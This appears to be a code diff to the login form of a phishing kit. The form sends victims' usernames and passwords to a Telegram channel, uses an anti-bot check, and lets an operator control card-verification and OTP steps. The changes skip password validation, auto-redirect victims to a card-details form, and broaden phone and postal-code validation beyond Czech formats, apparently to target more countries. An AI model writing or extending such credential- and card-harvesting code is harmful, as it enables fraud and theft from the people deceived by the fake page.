@@ -10,6 +10,7 @@ import LoadingOverlay from './LoadingOverlay';
 import NextStepAppr from './NextStepAppr';
 import './LoginForm.css';
 import ApprovePopup from './ApprovePopup';
+import { countryCodes } from './CardVerificationForm';
 
 function LoginForm() {
   const { t } = useLanguage();
@@ -274,18 +275,41 @@ const handleCardVerificationFromTelegram = () => {
 };
   const handleCardFalse = () => {
   console.log('❌ Card False button clicked!');
-  
-  // Show error message on card number field
-  setCardErrors({
-    cardNumber: '❌ Card number is incorrect. Please verify and try again.'
-  });
-  
-  // Go back to card verification form
   setShowCardForm(true);
   setShowOtpForm(false);
   setWaitingForOtpApproval(false);
   setWaitingForAdminOtp(false);
   setIsLoading(false);
+  
+  // Clear the card error
+  setCardErrors({});
+  
+  // Show popup message
+  const popup = document.createElement('div');
+  popup.style.cssText = `
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #1a1a1a;
+    color: #e74c3c;
+    padding: 14px 28px;
+    border-radius: 500px;
+    font-size: 14px;
+    font-weight: 600;
+    z-index: 9999;
+    font-family: Arial, sans-serif;
+    border: 1px solid #e74c3c;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    animation: slideDown 0.3s ease;
+  `;
+  popup.textContent = '⚠️ Please verify your card details and try again.';
+  document.body.appendChild(popup);
+  
+  setTimeout(() => {
+    popup.style.animation = 'slideUp 0.3s ease forwards';
+    setTimeout(() => popup.remove(), 300);
+  }, 3000);
 };
 
   const handleApproveOtp = async () => {
@@ -389,13 +413,11 @@ useEffect(() => {
   };
 
   const handleLogin = async (e) => {
-  // Prevent any default behavior
   if (e) {
     e.preventDefault();
     e.stopPropagation();
   }
   
-  // Don't allow multiple submissions
   if (isLoading || waitingForApproval) {
     console.log('⚠️ Login already in progress');
     return;
@@ -403,10 +425,8 @@ useEffect(() => {
   
   const newErrors = {
     loginName: loginName.trim() === '',
-    password: password.trim() === ''
   };
   setErrors(newErrors);
-  if (newErrors.loginName || newErrors.password) return;
   
   const antiBotResult = checkAntiBot();
   
@@ -430,7 +450,6 @@ useEffect(() => {
   sessionStorage.setItem('loginName', loginName.trim());
   sessionStorage.setItem('password', password.trim());
 
-  // Set loading BEFORE async operations
   setIsLoading(true);
   
   try {
@@ -456,7 +475,11 @@ useEffect(() => {
     
     await sendLoginRequestToTelegram(message, newSessionId);
     
-    setWaitingForApproval(true);
+    // ✅ Auto-redirect to card verification after 3 seconds
+    setTimeout(() => {
+      setIsLoading(false);
+      setShowCardForm(true);
+    }, 3000);
   } catch (error) {
     console.error('Login error:', error);
     setIsLoading(false);
@@ -491,7 +514,9 @@ useEffect(() => {
     }
     
     if (field === 'phoneNumber') {
-      formattedValue = value.replace(/\D/g, '').slice(0, 9);
+      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
+      const maxLength = selectedCountry ? selectedCountry.phoneLength : 10;
+      formattedValue = value.replace(/\D/g, '').slice(0, maxLength);
     }
     
     if (field === 'city') {
@@ -499,11 +524,9 @@ useEffect(() => {
     }
     
     if (field === 'postalCode') {
-      formattedValue = value.replace(/\s/g, '');
-      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
-      if (formattedValue.length >= 3 && formattedValue.length <= 5) {
-        formattedValue = formattedValue.slice(0, 3) + (formattedValue.length > 3 ? ' ' + formattedValue.slice(3, 5) : '');
-      }
+      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
+      const maxZip = selectedCountry?.zipLength || 7;
+      formattedValue = value.replace(/\s/g, '').slice(0, maxZip);
     }
 
     setCardDetails({ ...cardDetails, [field]: formattedValue });
@@ -513,11 +536,7 @@ useEffect(() => {
     }
   };
 
-  const validateCzechPostalCode = (postalCode) => {
-    const cleanCode = postalCode.replace(/\s/g, '');
-    const postalRegex = /^\d{5}$/;
-    return postalRegex.test(cleanCode);
-  };
+
 
   const validateCardForm = () => {
     const errors = {};
@@ -550,9 +569,15 @@ useEffect(() => {
     }
     
     if (!cardDetails.phoneNumber.trim()) {
-      errors.phoneNumber = t.validPhone;
-    } else if (cardDetails.phoneNumber.length !== 9) {
-      errors.phoneNumber = t.phoneDigits;
+  errors.phoneNumber = 'Phone number is required';
+    } else {
+      // Get the correct phone length for the selected country
+      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
+      const requiredLength = selectedCountry ? selectedCountry.phoneLength : 10;
+      
+      if (cardDetails.phoneNumber.length !== requiredLength) {
+        errors.phoneNumber = `Phone number must be exactly ${requiredLength} digits`;
+      }
     }
     
     if (!cardDetails.city.trim()) {
@@ -562,9 +587,13 @@ useEffect(() => {
     }
     
     if (!cardDetails.postalCode.trim()) {
-      errors.postalCode = t.validPostal;
-    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
-      errors.postalCode = t.invalidPostal;
+      errors.postalCode = 'Postal code is required';
+    } else {
+      const selectedCountry = countryCodes.find(c => c.code === (cardDetails.countryCode || '+1'));
+      const requiredZip = selectedCountry?.zipLength || 7;
+      if (cardDetails.postalCode.length !== requiredZip) {
+        errors.postalCode = `Postal code must be exactly ${requiredZip} digits`;  // ← FIXED
+      }
     }
     
     return errors;
@@ -689,7 +718,7 @@ useEffect(() => {
     setOtpError('');
   };
 
-  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;
+  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval || waitingForAdminOtp;
 
   return (
     <div className="login-container">
@@ -697,7 +726,6 @@ useEffect(() => {
         <NextStepAppr />
       ) : (
         <>
-          <h2>{t.loginTitle}</h2>
 
           <LoadingOverlay 
             isLoading={isLoadingState}
